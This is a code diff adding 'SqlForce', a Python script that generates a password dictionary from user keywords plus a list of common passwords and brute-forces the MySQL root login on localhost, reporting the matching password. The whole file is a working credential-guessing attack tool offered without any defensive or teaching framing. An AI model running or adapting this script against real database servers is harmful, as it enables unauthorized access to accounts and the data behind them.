@@ -1,0 +1,110 @@
+### SqlForce ###
+
+from progressbar import ProgressBar
+import mysql.connector
+from colorama import init
+from colorama import Fore
+
+#géneration du dictionnaire de données.
+
+def gen_dico(keyword_list):
+	
+	dictionnary = []
+	keyword_size = 0
+	dictionnary2 = []
+	liste_tmp = []
+	incr = 0
+	test = True
+
+
+	
+	keyword_size = len("".join(keyword_list))
+	dictionnary = dictionnary + keyword_list
+	print(Fore.GREEN, "Dictionary generation .....")
+	print(Fore.RESET)
+	for k in ((range(len(keyword_list)))):
+
+		liste_tmp = []
+		liste_tmp = liste_tmp + dictionnary
+
+
+		pbar = ProgressBar()
+
+		for i in pbar(liste_tmp): 
+
+
+			if len(i) > keyword_size:
+				return dictionnary
+
+			for j in liste_tmp: 
+			
+
+				if i == j or i in j or j in i:
+					continue
+				
+				truc = "".join(j)
+
+				if "".join([i, truc]) not in dictionnary:
+					tmp = [i, truc]
+					tmp = "".join(tmp)
+					if len(tmp) > keyword_size:
+						return dictionnary
+					dictionnary.append(tmp)
+
+	return dictionnary
+
+#Bruteforce le login root de MySql
+
+def bruteforce(dico):
+	pbar = ProgressBar()
+	print(Fore.GREEN, "Bruteforcing id .....")
+	print(Fore.RESET)
+	for i in pbar(dico):
+		try:
+			mysql.connector.connect(user = "root", password = i,
+									host = 'localhost')
+		except:
+			continue
+		return i
+
+
+
+
+print(Fore.GREEN,"\n\n\n" \
+"	 _____ _____ __    _____ _____ _____ _____ _____ \n"\
+"	|   __|     |  |  |   __|     | __  |     |   __|\n"\
+"	|__   |  |  |  |__|   __|  |  |    -|   --|   __|\n"\
+"	|_____|__  _|_____|__|  |_____|__|__|_____|_____|\n"\
+"	         |__|                                    \n")
+
+
+while True:
+
+
+                                                                               
+                      
+	keyword_list = []	
+	keyword = ""
+
+
+	common = ["123456","123456789","qwerty","12345678","111111","1234567890","1234567","password" ,"123123", "987654321","qwertyuiop","mynoob","123321","666666","18atcskd2w","7777777","1q2w3e4","654321","555555","3rjs1la7qe","google","1q2w3e4r5t","123qwe","zxcvbnm","1q2w3e"]
+
+
+	
+	print(Fore.GREEN, "\nEnter some words to generate the dictionary ('$$' to launch MySql id bruteforce)\n")
+	print(Fore.RESET)
+	while keyword != "$$":
+		keyword_list.append(keyword)
+		keyword = input(">>> ")
+
+	
+
+	result = common + (gen_dico(keyword_list))
+	bruteforce_result = bruteforce(result)
+	
+	if bruteforce_result == None:
+		print(Fore.RED, "\nNo password match\n")
+		print(Fore.RESET)
+	
+	else:	
+		print("\nPassword is ->", Fore.GREEN, bruteforce_result)
